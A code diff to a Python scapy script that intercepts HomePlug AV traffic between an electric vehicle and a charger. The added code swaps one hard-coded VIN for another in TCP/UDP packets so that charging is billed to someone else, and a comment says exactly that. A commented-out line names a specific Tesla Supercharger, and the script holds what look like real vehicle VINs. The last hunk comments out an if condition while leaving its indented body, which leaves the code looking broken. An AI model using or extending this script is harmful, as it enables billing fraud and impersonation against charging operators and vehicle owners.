@@ -1,17 +1,20 @@
 import os
-from scapy.all import Ether, Dot1Q, IPv6, sendp, sniff, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
+from time import sleep
+from scapy.all import Ether, Dot1Q, IPv6, sendp, sniff, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, TCP, UDP, Raw, Packet
 from scapy.contrib.homeplugav import HomePlugAV
 from scapy.contrib.homepluggp import CM_SET_KEY_REQ
 from optparse import OptionParser
 from binascii import unhexlify
 
 
-int6krule = "/home/jakob/git/open-plc-utils/plc/int6krule"
-pev_modem_mac = "98:ed:5c:93:0d:66"
-evse_modem_mac = None # "00:01:87:05:b7:95"
+int6krule = "/usr/local/bin/int6krule" # int6krule = "/home/jakob/git/open-plc-utils/plc/int6krule"
+pev_modem_mac = None # "98:ed:5c:93:0d:66"
+evse_modem_mac = None # '98:ed:5c:ff:e3:80' # tesla supercharger Kösching 3C        # "00:01:87:05:b7:95"
 evse_mac = None
 pev_mac = None
 
+thi_vin = b"LRW3E7FA0MC379445"
+fsd_vin = b"5YJ3E7EC2MF882807"
 
 
 def set_key_on_modem(nid, nmk, srcmac, dstmac, interface):
@@ -22,7 +25,6 @@ def set_key_on_modem(nid, nmk, srcmac, dstmac, interface):
     # send packet twice -> first time the response is a failure for some reason
     sendp(set_key_pkg, iface=interface, verbose=0)
     sendp(set_key_pkg, iface=interface, verbose=0)
-
 
 def handle_cm_slac_match_cnf(packet, iface, src_mac, dst_mac):
     nid = packet['CM_SLAC_MATCH_CNF']['SLAC_varfield'].NetworkID
@@ -37,14 +39,49 @@ def handle_cm_slac_match_cnf(packet, iface, src_mac, dst_mac):
 
     set_key_on_modem(nid, nmk, src_mac, dst_mac, iface)
 
+def replace_vin_if_present(packet):
+    """
+    checks if the thi_vin is present in this packet
+    if so it replaces it and recalculates the checksum
+
+    :param packet: the packet which should be analyzed/changed
+    :return: None or changed packet, if thi_vin was present
+    """
+    if packet.haslayer(TCP) or packet.haslayer(UDP):
+        if packet.haslayer(Raw):
+            payload = packet[Raw].load
+            if thi_vin in payload:
+                # Replace VIN in packet
+                packet[Raw].load = packet[Raw].load.replace(thi_vin, fsd_vin)
+                packet = replaceChecksum(packet)
+                return packet
+    return None
+            
+def replaceChecksum(packet: Packet):
+    if packet.haslayer("IP"):
+        del packet["IP"].chksum
+
+    if packet.haslayer(TCP):
+        del packet[TCP].chksum
+    elif packet.haslayer(UDP):
+        del packet[UDP].chksum
+    
+    return packet
 
 def handle_packet(packet, iface, our_mac, dst_mac):
     global evse_mac, pev_mac
 
+    # Replace VIN in packet, if present for trying to charge on someones cost
+    new_packet = replace_vin_if_present(packet)
+    if (new_packet):
+        # if there is a new packet, the vin was replaced
+        packet = new_packet
+
     if 'HomePlugAV' in packet and packet['HomePlugAV'].HPtype == 0x607d:
         handle_cm_slac_match_cnf(packet, iface, our_mac, dst_mac)
 
-    if 'HomePlugAV' in packet and packet['HomePlugAV'].HPtype == 0x6065:
+        # sleep(0.5)
+    # if 'HomePlugAV' in packet and packet['HomePlugAV'].HPtype == 0x6065:
         # Get pev and evse mac addresses
         evse_mac = packet[Ether].src
         pev_mac = packet[Ether].dst
